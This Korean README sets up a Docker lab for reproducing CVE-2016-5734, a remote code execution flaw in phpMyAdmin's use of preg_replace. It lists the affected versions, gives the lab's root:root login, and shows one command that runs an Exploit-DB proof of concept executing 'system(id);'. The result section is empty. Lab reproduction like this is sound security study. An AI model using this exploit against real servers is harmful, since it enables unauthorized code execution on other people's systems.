# CVE-2016-5734 | PhpMyAdmin 4.0.x—4.6.2 Remote Code Execution(원격 코드 실행) 취약점

> 화이트햇 스쿨 3기 (6반) - [임건형 (@lghz)](https://github.com/lghz) 

[중국어 버전(Chinese version)](README.zh-cn.md)

<br/>

PhpMyAdmin은 PHP로 작성된 무료 소프트웨어 도구로, 웹을 통해 MySQL 관리를 처리하기 위해 만들어졌습니다. 취약점은 preg_replace 함수에 있으며, 사용자가 제출한 정보가 첫 번째 매개변수에 삽입될 수 있기 때문입니다.

PHP 5.4.7 이전 버전에서는 preg_replace의 첫 번째 매개변수가 \0으로 잘려나갈 수 있었고, 검색 패턴이 \e로 변경될 수 있었습니다. 이로 인해 원격 코드 실행 취약점이 발생할 수 있습니다.

영향을 받는 버전:

4.0.x 버전 중 4.0.10.16 이전 버전

4.4.x 버전 중 4.4.15.7 이전 버전

4.6.x 버전 중 4.6.3 이전 버전 (사실 이 버전은 PHP 5.5 이상을 요구하므로, 이 취약점은 재현되지 않습니다)

<br/>

## 설정

다음 명령어를 실행하여 PHP 5.3 + Apache + phpMyAdmin 4.4.15.6 환경을 시작하세요:

```
docker compose up -d 
```

시작한 후 http://your-ip:8080에 접속하면 phpMyAdmin 로그인 페이지가 나타납니다.
root:root 계정으로 로그인하세요.

</br>

## 익스플로잇

이 취약점을 이용하려면 로그인과 데이터 쓰기 권한이 필요합니다.

우리는 이 POC(https://www.exploit-db.com/exploits/40185/)를 사용하여 취약점을 재현합니다.

```
./cve-2016-5734.py -c 'system(id);' -u root -p root -d test http://your-ip:8080/
```

Result:
